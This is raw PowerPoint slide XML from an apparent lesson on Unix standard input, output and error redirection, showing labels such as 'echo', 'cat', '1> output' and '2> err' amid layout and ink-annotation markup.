                <a:ext cx="420496" cy="370098"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
            </p:spPr>
          </p:pic>
        </mc:Fallback>
      </mc:AlternateContent>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="19" name="Group 18">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BA2092D9-41BB-35DA-110D-05E0D7227419}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="871287" y="1960222"/>
            <a:ext cx="7209000" cy="3651120"/>
            <a:chOff x="871287" y="2089762"/>
            <a:chExt cx="7209000" cy="3651120"/>
          </a:xfrm>
        </p:grpSpPr>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960A42CD-C9C2-4F3C-EA82-08FC10F02016}"/>
                    </a:ext>
                  </a:extLst>
                </p14:cNvPr>
                <p14:cNvContentPartPr/>
                <p14:nvPr/>
              </p14:nvContentPartPr>
              <p14:xfrm>
                <a:off x="871287" y="5149402"/>
                <a:ext cx="339480" cy="317880"/>
              </p14:xfrm>
            </p:contentPart>
          </mc:Choice>
          <mc:Fallback xmlns="">
            <p:pic>
              <p:nvPicPr>
                <p:cNvPr id="7" name="Ink 6">
                  <a:extLst>
                    <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                      <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{960A42CD-C9C2-4F3C-EA82-08FC10F02016}"/>
                    </a:ext>
                  </a:extLst>
                </p:cNvPr>
                <p:cNvPicPr/>
                <p:nvPr/>
              </p:nvPicPr>
              <p:blipFill>
                <a:blip r:embed="rId8"/>
                <a:stretch>
                  <a:fillRect/>
                </a:stretch>
              </p:blipFill>
              <p:spPr>
                <a:xfrm>
                  <a:off x="862287" y="5140402"/>
                  <a:ext cx="35712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26BCBAFC-B799-8E38-6A3E-E2C84191B8C7}"/>
                    </a:ext>
                  </a:extLst>
                </p14:cNvPr>
                <p14:cNvContentPartPr/>
                <p14:nvPr/>
              </p14:nvContentPartPr>
              <p14:xfrm>
                <a:off x="1264767" y="2206042"/>
                <a:ext cx="6792840" cy="2998440"/>
              </p14:xfrm>
            </p:contentPart>
          </mc:Choice>
          <mc:Fallback xmlns="">
            <p:pic>
              <p:nvPicPr>
                <p:cNvPr id="8" name="Ink 7">
                  <a:extLst>
                    <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                      <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{26BCBAFC-B799-8E38-6A3E-E2C84191B8C7}"/>
                    </a:ext>
                  </a:extLst>
                </p:cNvPr>
                <p:cNvPicPr/>
                <p:nvPr/>
              </p:nvPicPr>
              <p:blipFill>
                <a:blip r:embed="rId10"/>
                <a:stretch>
                  <a:fillRect/>
                </a:stretch>
              </p:blipFill>
              <p:spPr>
                <a:xfrm>
                  <a:off x="1255767" y="2197042"/>
                  <a:ext cx="6810480" cy="3016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D462BE2A-6A73-B7B3-A568-77DA09958A48}"/>
                    </a:ext>
                  </a:extLst>
                </p14:cNvPr>
                <p14:cNvContentPartPr/>
                <p14:nvPr/>
              </p14:nvContentPartPr>
              <p14:xfrm>
                <a:off x="7918287" y="2089762"/>
                <a:ext cx="118080" cy="245520"/>
              </p14:xfrm>
            </p:contentPart>
          </mc:Choice>
          <mc:Fallback xmlns="">
            <p:pic>
              <p:nvPicPr>
                <p:cNvPr id="13" name="Ink 12">
                  <a:extLst>
                    <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                      <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D462BE2A-6A73-B7B3-A568-77DA09958A48}"/>
                    </a:ext>
                  </a:extLst>
                </p:cNvPr>
                <p:cNvPicPr/>
                <p:nvPr/>
              </p:nvPicPr>
              <p:blipFill>
                <a:blip r:embed="rId12"/>
                <a:stretch>
                  <a:fillRect/>
                </a:stretch>
              </p:blipFill>
              <p:spPr>
                <a:xfrm>
                  <a:off x="7909287" y="2081122"/>
                  <a:ext cx="13572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D408BFF6-7043-3711-DEA9-6EC294C297C5}"/>
                    </a:ext>
                  </a:extLst>
                </p14:cNvPr>
                <p14:cNvContentPartPr/>
                <p14:nvPr/>
              </p14:nvContentPartPr>
              <p14:xfrm>
                <a:off x="1305807" y="2765842"/>
                <a:ext cx="6753240" cy="2975040"/>
              </p14:xfrm>
            </p:contentPart>
          </mc:Choice>
          <mc:Fallback xmlns="">
            <p:pic>
              <p:nvPicPr>
                <p:cNvPr id="16" name="Ink 15">
                  <a:extLst>
                    <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                      <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D408BFF6-7043-3711-DEA9-6EC294C297C5}"/>
                    </a:ext>
                  </a:extLst>
                </p:cNvPr>
                <p:cNvPicPr/>
                <p:nvPr/>
              </p:nvPicPr>
              <p:blipFill>
                <a:blip r:embed="rId14"/>
                <a:stretch>
                  <a:fillRect/>
                </a:stretch>
              </p:blipFill>
              <p:spPr>
                <a:xfrm>
                  <a:off x="1297167" y="2756842"/>
                  <a:ext cx="6770880" cy="2992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1BC7AFB8-97AF-83CE-D450-18CEBF7C5B06}"/>
                    </a:ext>
                  </a:extLst>
                </p14:cNvPr>
                <p14:cNvContentPartPr/>
                <p14:nvPr/>
              </p14:nvContentPartPr>
              <p14:xfrm>
                <a:off x="7940607" y="2694922"/>
                <a:ext cx="139680" cy="95760"/>
              </p14:xfrm>
            </p:contentPart>
          </mc:Choice>
          <mc:Fallback xmlns="">
            <p:pic>
              <p:nvPicPr>
                <p:cNvPr id="18" name="Ink 17">
                  <a:extLst>
                    <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                      <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1BC7AFB8-97AF-83CE-D450-18CEBF7C5B06}"/>
                    </a:ext>
                  </a:extLst>
                </p:cNvPr>
                <p:cNvPicPr/>
                <p:nvPr/>
              </p:nvPicPr>
              <p:blipFill>
                <a:blip r:embed="rId16"/>
                <a:stretch>
                  <a:fillRect/>
                </a:stretch>
              </p:blipFill>
              <p:spPr>
                <a:xfrm>
                  <a:off x="7931607" y="2686282"/>
                  <a:ext cx="157320" cy="11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C8355774-87A5-919B-E69E-1F51DDFC4A58}"/>
                  </a:ext>
                </a:extLst>
              </p14:cNvPr>
              <p14:cNvContentPartPr/>
              <p14:nvPr/>
            </p14:nvContentPartPr>
            <p14:xfrm>
              <a:off x="2825367" y="-49718"/>
              <a:ext cx="3240" cy="1440"/>
            </p14:xfrm>
          </p:contentPart>
        </mc:Choice>
        <mc:Fallback xmlns="">
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="20" name="Ink 19">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C8355774-87A5-919B-E69E-1F51DDFC4A58}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr/>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId18"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="2816727" y="-58358"/>
                <a:ext cx="20880"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1" name="Ink 20">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C4E34C17-51EA-F1E7-199C-A0E5A43F3001}"/>
                  </a:ext>
                </a:extLst>
              </p14:cNvPr>
              <p14:cNvContentPartPr/>
              <p14:nvPr/>
            </p14:nvContentPartPr>
            <p14:xfrm>
              <a:off x="8119167" y="714922"/>
              <a:ext cx="360" cy="360"/>
            </p14:xfrm>
          </p:contentPart>
        </mc:Choice>
        <mc:Fallback xmlns="">
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="21" name="Ink 20">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C4E34C17-51EA-F1E7-199C-A0E5A43F3001}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr/>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId20"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="8110527" y="705922"/>
                <a:ext cx="18000" cy="18000"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
            </p:spPr>
          </p:pic>
        </mc:Fallback>
      </mc:AlternateContent>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3015196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Standard output: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>stdout</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Slide Number Placeholder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:fld id="{00000000-1234-1234-1234-123412341234}" type="slidenum">
              <a:rPr lang="en" smtClean="0"/>
              <a:pPr algn="ctr"/>
              <a:t>6</a:t>
            </a:fld>
            <a:endParaRPr lang="en"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Oval 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="631527" y="2333144"/>
            <a:ext cx="2017381" cy="1087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FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>echo</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="14" name="Straight Arrow Connector 13"/>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
            <a:stCxn id="5" idx="6"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2648908" y="2876960"/>
            <a:ext cx="1141554" cy="123330"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="57150">
            <a:solidFill>
              <a:srgbClr val="7030A0"/>
            </a:solidFill>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="1">
            <a:schemeClr val="accent6"/>
          </a:lnRef>
          <a:fillRef idx="0">
            <a:schemeClr val="accent6"/>
          </a:fillRef>
          <a:effectRef idx="0">
            <a:schemeClr val="accent6"/>
          </a:effectRef>
          <a:fontRef idx="minor">
            <a:schemeClr val="tx1"/>
          </a:fontRef>
        </p:style>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="TextBox 18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2604877" y="2238001"/>
            <a:ext cx="1415772" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>1&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>output</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="15" name="Picture 14"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5455421" y="2055336"/>
            <a:ext cx="5982535" cy="2730881"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Graphic 3" descr="Document outline">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{53BBAAEF-47FD-4233-BA5D-FEFD81D7C1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94964" y="2543090"/>
            <a:ext cx="914400" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="11" name="Straight Arrow Connector 10">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{87D0A159-7E14-4BF7-9CB0-3297C5F40739}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4313866" y="3070628"/>
            <a:ext cx="1141554" cy="123330"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="57150">
            <a:solidFill>
              <a:srgbClr val="7030A0"/>
            </a:solidFill>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="1">
            <a:schemeClr val="accent6"/>
          </a:lnRef>
          <a:fillRef idx="0">
            <a:schemeClr val="accent6"/>
          </a:fillRef>
          <a:effectRef idx="0">
            <a:schemeClr val="accent6"/>
          </a:effectRef>
          <a:fontRef idx="minor">
            <a:schemeClr val="tx1"/>
          </a:fontRef>
        </p:style>
      </p:cxnSp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Graphic 2" descr="Document outline">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9BCCEF90-E352-1AA6-AF03-BD9A49205B5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7681" y="3985846"/>
            <a:ext cx="914400" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="6" name="Straight Arrow Connector 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6EE24E55-EC09-A96F-1CAC-D881D36537A9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
            <a:endCxn id="5" idx="4"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="1527777" y="3420776"/>
            <a:ext cx="112441" cy="64245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6" name="TextBox 15">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A7166D24-8FC4-F263-22CA-7A0BD1ACF199}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1058723" y="3489398"/>
            <a:ext cx="1428596" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>0&lt;    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>input</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="TextBox 16">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EE8C9AD7-C4A6-D958-F5F0-30F414F05EC2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8044405" y="1296365"/>
            <a:ext cx="2750240" cy="400110"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent6"/>
                </a:solidFill>
              </a:rPr>
              <a:t>default input and output</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="20" name="Straight Arrow Connector 19">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A9ECA26E-7BFF-984F-990C-A347AA865302}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:stCxn id="17" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="7917084" y="1696475"/>
            <a:ext cx="1502441" cy="63666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89025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example</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Slide Number Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{E24DD715-7292-4FAD-A484-09D5D92FAB07}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>7</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="568379" y="2027765"/>
            <a:ext cx="5759451" cy="3778287"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6533576" y="1721271"/>
            <a:ext cx="5658424" cy="4084780"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1435293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Standard error: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>stderr</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Oval 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="956063" y="2631367"/>
            <a:ext cx="2017381" cy="10876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cat</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="11" name="Straight Arrow Connector 10"/>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
            <a:endCxn id="13" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="2973444" y="3000290"/>
            <a:ext cx="621520" cy="1004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2" name="TextBox 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3136057" y="2232403"/>
            <a:ext cx="1138453" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2&gt;    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>err</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="TextBox 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4238119" y="4601455"/>
            <a:ext cx="6465324" cy="1200329"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Segoe Print" panose="02000600000000000000" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>Save error messages to a file </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Segoe Print" panose="02000600000000000000" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>error.txt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Segoe Print" panose="02000600000000000000" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t> as the system can’t find </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Segoe Print" panose="02000600000000000000" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>foo.txt</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="10" name="Picture 9"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5771466" y="2215782"/>
            <a:ext cx="5880921" cy="1613125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="14" name="Straight Arrow Connector 13"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="7087148" y="2920818"/>
            <a:ext cx="701699" cy="168063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13" name="Graphic 12" descr="Document outline">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6D4CB1C1-5E6E-4A60-AA2A-6F438E77FB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594964" y="2543090"/>
            <a:ext cx="914400" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="15" name="Straight Arrow Connector 14">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BF32E79E-7808-4B3C-A85C-7876A58075FA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4313866" y="3070628"/>
            <a:ext cx="1141554" cy="123330"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="57150">
            <a:solidFill>
              <a:srgbClr val="7030A0"/>
            </a:solidFill>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1432862E-03CB-4412-166B-0D44F528ACDF}"/>
                  </a:ext>
                </a:extLst>
              </p14:cNvPr>
              <p14:cNvContentPartPr/>
              <p14:nvPr/>
            </p14:nvContentPartPr>
            <p14:xfrm>
              <a:off x="5549969" y="5422203"/>
              <a:ext cx="7560" cy="7200"/>
            </p14:xfrm>
          </p:contentPart>
        </mc:Choice>
        <mc:Fallback xmlns="">
          <p:pic>
            <p:nvPicPr>
              <p:cNvPr id="4" name="Ink 3">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1432862E-03CB-4412-166B-0D44F528ACDF}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvPicPr/>
              <p:nvPr/>
            </p:nvPicPr>
            <p:blipFill>
              <a:blip r:embed="rId6"/>
              <a:stretch>
                <a:fillRect/>
              </a:stretch>
            </p:blipFill>
            <p:spPr>
              <a:xfrm>
                <a:off x="5540969" y="5413563"/>
                <a:ext cx="25200" cy="24840"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
            </p:spPr>
          </p:pic>
        </mc:Fallback>
      </mc:AlternateContent>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1674251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Network utilities use standard devices </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Subtitle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
